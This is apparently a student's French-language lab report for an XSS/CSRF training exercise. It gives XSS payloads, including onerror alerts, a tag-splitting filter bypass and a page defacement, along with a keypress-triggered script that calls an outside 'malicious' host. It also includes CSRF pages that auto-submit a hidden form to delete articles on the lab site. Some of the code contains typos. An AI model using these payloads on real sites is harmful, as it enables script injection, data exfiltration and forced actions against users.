Compte-rendu tp5 XSS/CSRF

Level 1:
https://xss-csrf-tp.herokuapp.com/level/1?page=%3Cimg%20src=%22%22%20onerror=%22alert(%27helo%27)%22%3E

Level 2:
Q1)
<img src="" onerror="alert('yo')">

Q2)
<script>alert('d')</scritp>

La balise script doit etre reconnue et bloquée au moment de l'envoie du formulaire.
De plus, il est possible que certains caractères de l'injection soient remplacés, par exemple un espace = %20.

Q3)
fetch('/articles/all')

Q4)
<img src="" onerror="document.write('<div>fin du game</div>');">	

Q5) 

Level 3:

1) <i<img>mg src='toto.jpg' onerror="document.write('<div>fin du game</div>');"/>

2)

 (function() {
      var httpRequest;
      window.addEventListener('keypress', makeRequest);

      function makeRequest() {
        httpRequest = new XMLHttpRequest();

        if (!httpRequest) {
          console.log('Création impossible');
          return false;
        }
        httpRequest.onreadystatechange = alertContents;
        httpRequest.open('GET', 'https://my-malicious-website-brandon.herokuapp.com/keylogger.php');
        httpRequest.setRequestHeader('Access-Control-Allow-Origin', null);
        httpRequest.send();
      }

      function alertContents() {
        if (httpRequest.readyState === XMLHttpRequest.DONE) {
          if (httpRequest.status === 200) {
            console.log(httpRequest.responseText);
          } else {
            console.log('Probleme avec la requete');
          }
        }
      }
    })();



Partie 2 - CSRF

1) https://my-malicious-website-brandon.herokuapp.com/

2)
<?php include_once("index.html"); ?>

<form
	action="https://xss-csrf-tp.herokuapp.com/articles/delete"
	method="GET"
    id="12"
>
</form>

<script>
	document.getElementById("12").submit();
</script>

3)
<?php include_once("index.html"); ?>

<iframe name="hiddenIFrame" style="display: none;"></iframe>

<form
	action="https://xss-csrf-tp.herokuapp.com/articles/delete"
    method="about:blank"
    id="12"
    target="hiddenIFrame"
>
</form>

<script>
	document.getElementById("12").submit();
</script>
